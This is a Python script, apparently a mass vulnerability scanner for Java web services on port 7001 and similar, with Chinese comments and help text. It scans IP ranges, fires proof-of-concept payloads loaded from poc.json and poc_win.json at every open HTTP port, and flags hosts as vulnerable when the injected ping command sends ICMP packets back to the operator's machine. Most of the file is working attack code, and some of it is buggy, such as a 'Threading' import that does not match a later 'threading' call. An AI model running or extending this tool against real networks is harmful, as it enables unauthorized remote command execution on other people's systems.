# coding=utf-8
import nmap
import time
import Threading
import requests
import json
import socket
from scapy.all import *
import sys
import getopt

ip_ld = set()

# 存储存在漏洞主机的ip
def packet_callback(sa):
    for i in sa:
        try:
            print('\033[31;1m[!]'+i['IP'].src+'存在漏洞！\033[0m')
            ip_ld.add(i['IP'].src)
        except:
            print("ICMP包解析错误")

# 捕获返回的ICMP包
def sniff_ping():
    sniff(filter='icmp and dst yourIP',prn=packet_callback)

# 发送POC
def use_poc(ip,port,poc):
    print('[+]'+str(ip) + ' Start send')
    with open(poc) as f:
        poc_dict = json.load(f)
    head = poc_dict['header'].split(':')
    data = poc_dict['data']
    url = poc_dict['url']
    data = '\n'.join(data)
    header = {}
    header[head[0]] = head[1]
    url_fin ='http://'+ip+':'+str(port)+'/'+url

    requests.post(url_fin,headers=header,data=data,timeout=3)

    time.sleep(2)# 暂停3秒结束，用来保证ICMP包返回

    print('[+]'+str(ip) + ' End send')

# 主机扫描_py-nmap
def pc_scan(ip,port,t):
    data = {}  # 保存开放端口
    print('[*]'+str(ip)+' start scan')
    nmScan = nmap.PortScanner()
    result = nmScan.scan(hosts=ip,ports=port,arguments='-T4 -sV') # 开始扫描
    # 对扫描结果进行处理
    result_ip_list = result['scan']
    for k,v in result_ip_list.items():
        if 'tcp' in v:
            port_list = []
            for p,v_p in v['tcp'].items():
                if v_p['state'] == 'open' and 'name' in v_p and v_p['name'] =='http':
                    port_list.append(p)
            if len(port_list)>0:
                data[k] = port_list
    print('[*]'+str(ip) + ' stop scan')
    return data

def pc_scan_socket(ip,port,data):
    # print('[*]' + str(ip)+str(port)+ ' Start scan')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建socket
    s.settimeout(2)  # 设置timeout时间
    result = s.connect_ex((ip, int(port)))
    # 判断是否开放
    if result == 0:
        if ip in data:
            data[ip].append(port)
        else:
            data[ip] = [port]

    # print('[*]' + str(ip) + str(port) + ' Stop scan')


# 主机端口扫描socket
def pc_scan_F(ip,port,thread):
    # 扫描线程池
    t = Threading.ThreadPool(int(thread)) # 此处只设置线程池最大数量，智能线程池数量控制放到线程池类里面
    count = 0
    data = {}
    for i in ip:
        print('[*]' + str(i) + ' add scan')
        for p in port:
            t.callInThread(pc_scan_socket,i,p,data)
            if count > 20:
                break
            elif count == 20:
                t.start()
            else:
                count+=1

    if count <20:
        t.start()
    t.stop()
    while t.working:
        pass
    return data

def pc_scan_route(ip,port,t,isF,thread):
    # 主要用于扫描的类型判断
    if (isF):
        # 需要进行ip port 切割
        ip_l = ip_split_1(ip)
        port_l = port_split(port)
        # 扫描
        data = pc_scan_F(ip_l,port_l,thread)

    else:
        data = pc_scan(ip,port,t)

    for k,v in data.items():
        for i in v:
            t.callInThread(use_poc,k,i,'poc.json')
            t.callInThread(use_poc,k,i,'poc_win.json')

def pc_scan_m(ip,port,isF,thread): # 扫描主机,并捕获返回的ICMP包

    start_time = time.time()
    # 创建poc利用线程池
    t_poc = Threading.ThreadPool(20)

    pc_scan_route(ip,port,t_poc,isF,thread)  # 启动扫描

    snif = threading.Thread(target=sniff_ping) # 开始捕获返回包
    snif.daemon = True # 设置线程daemon，让sniff
    snif.start()
    t_poc.start()   # 开始执行poc
    t_poc.stop()
    while t_poc.working:  # 等待结束
        pass
    print("END  用时"+str(time.time()-start_time))

# ip分割函数，返回ip的列表
def ip_split_1(ip):
    # -\,ip分割
    try:
        ip_list = ip.split('.')
        ip_header = '.'.join(ip_list[:3])
        ip_scope_s = ip_list[-1:]
    except:
        print("Try -h for more information!")
        sys.exit(2)
    ip_list = []

    if '-' in ip:
        ip_scope = ip_scope_s[0].split('-')
        ip_start = int(ip_scope[0])
        ip_end = int(ip_scope[1])+1
        for i in range(ip_start,ip_end):
            ip_list.append(ip_header+'.'+str(i))

    elif ',' in ip:
        ip_scope_s = ip_scope_s[0].split(',')
        for i in ip_scope_s:
            ip_list.append(ip_header + '.' + str(i))
    else:
        ip_list.append(ip)

    return ip_list

# 端口分割
def port_split(port):
    # ,ip\port分割
    port_list = []
    if ',' in port:
        port_list = port.split(',')
    elif '-' in port:
        try:
            p_l = port.split('-')
            p_start = int(p_l[0])
            p_end = int(p_l[1])+1
            for i in range(p_start,p_end):
                port_list.append(str(i))
        except:
            print("Try -h for more information!")
            sys.exit(2)
    else:
        port_list.append(port)
    return port_list

if __name__ == '__main__':

    port = '7001'
    f = False   # 快速扫描
    argv = sys.argv[1:] # 获得输入的参数
    thread = 16

    # 解析参数
    try:
        opts,args = getopt.getopt(argv,"hfi:p:c:t:",["help","ip=","port=","poc=","fast"])
    except getopt.GetoptError:
        print("Try -h for more information!")
        sys.exit(2)
    for opt,arg in opts:
        if opt in ("-h","--help"):
            print("java_scan.py -i IP地址 [options]")
            print("---------------------------------------------")
            print("-h   --help      获取帮助")
            print("-i   --ip        必须指定ip地址或地址段")
            print("         ip地址段   192.168.1.1-254")
            print("         多ip地址逗号（英文）分隔   192.168.1.1,25")
            print("-p   --port      指定端口，用法同ip")
            print("-f   --fast      此选项用于快速扫描")
            print("         -t      此选项用于指定快速扫描的线程数，默认为16")
            print("-c   --poc       自定义poc，此功能待完善")

            print("\n默认poc在程序根目录，分别为poc.json和poc_win.json。两个分别用于linux家族和windows家族ping命令的，使用前请修改两个poc中的ping的地址为本机地址。")
            print("由于调用scapy程序启动时会卡顿一会")
            sys.exit(0)
        elif opt in ("-i","--ip"):
            ip = arg
        elif opt in ("-p","--port"):
            port = arg
        elif opt in ("-f","--fast"):
            f = True
        elif opt in ("-t"):
            try:
                thread = int(arg)
            except:
                print("Try -h for more information!")
                sys.exit(2)


    # 判断是否定义ip
    if 'ip' not in locals():
        print("Try -h for more information!")
        sys.exit(2)
    else:
        pc_scan_m(ip,port,f,thread)
        print('--------------发现存在漏洞IP--------------')
        for i in ip_ld:
            print(i)
        # print("本机IP也会在此列表中，但不代表有此漏洞")
        print('------------------------------------------')

    # pc_scan_m('ip','port')单端口单ip使用示例
    # pc_scan_m('10.10.10.1-255','80,443,7001')  or pc_scan_m('ip1,ip2,...',port)多ip使用示例
    # pc_scan_m('10.60.18.60-61','7001')
    # print('--------发现存在漏洞IP---------')
    # for i in ip_ld:
    #     print(i)
    # print('-------------------------------')
